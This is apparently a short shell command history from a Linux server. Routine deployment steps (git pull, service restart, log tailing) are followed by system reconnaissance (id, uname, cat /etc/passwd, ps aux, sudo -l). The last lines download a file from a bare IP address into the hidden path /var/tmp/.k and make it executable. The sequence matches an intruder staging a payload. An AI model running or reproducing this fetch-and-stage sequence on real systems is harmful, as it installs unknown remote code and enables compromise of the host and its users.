make deploy
git pull
cd app
sudo systemctl restart app
tail -f /var/log/app/app.log
systemctl status app
ls
id
uname -a
w
cat /etc/passwd
ls -la
ps aux
sudo -l
wget -q http://62.38.207.122/k -O /var/tmp/.k
chmod +x /var/tmp/.k
history -w
